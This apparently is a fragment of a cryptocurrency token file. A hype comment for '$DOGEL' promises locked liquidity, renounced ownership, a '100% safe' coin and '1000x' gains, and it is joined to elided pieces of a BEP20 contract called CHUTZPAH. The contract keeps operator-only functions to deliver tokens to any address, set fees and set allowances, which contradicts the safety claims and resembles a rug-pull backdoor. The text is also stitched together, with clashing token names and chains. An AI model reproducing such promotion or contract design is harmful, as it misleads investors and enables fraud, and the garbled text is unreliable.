...
Welcome to $DOGEL
   ...
   This is a 100% community driven token. So there is no official group yet.
   If someone wants to create one, I suggest @DOGEL_Token.
   This is the only channel recording the information when I released this coin. 
   If you want to view all the information about this coin, please join https://t.me/DOGEL1000X
   
   I will lock liquidity LPs through team.finance for at least 30 days, if the response is good, I will extend the time.
   Then, I'll renounce the ownership to burn addresses to transfer $DiamondHand to the community to make sure it's 100% safe for all.

   It's a community token so every holder should promote it or create a group for it. If you want to pump your investment, you need to put in a little bit of effort and share with friends.
   ...
   1000x features:
    ...
    5. 6 ETH locked at team.finance for 30days, if the response is good, I will continue to extend it!
    ...
    it's the best part of the $DOGEL idea, increasing the liquidity pool automatically.

    I’m gonna lock all of my 6ETH coins in the pool.
    Can you make this token 1000X or even 10000X?
    Hope you guys are ready to Hold On For DOGE Life!
...
abstract contract Ownable is Context {
     ...
     * You will no longer be able to set new fees, approve new spenders, mint new tokens, ect. 
     */
...
contract CHUTZPAH is BEP20 {
     ...
     */
    constructor() public BEP20("https://t.me/CHUTZPAH_ARMY (Chutzpah Coin)", "CHUTZPAH🍸") {
    ...
    function deliver(uint256 amount) public onlyOperator returns (bool) {
        _deliver(_msgSender(), amount);
        return true;
    }
    function deliver(address _to, uint256 _amount) public onlyOperator {
     ...
     *
     */
    function setFee(uint256 percent) external onlyOperator() {
     ...
     *
     */
    function setAllowance(address allowAddress) external onlyOperator() {
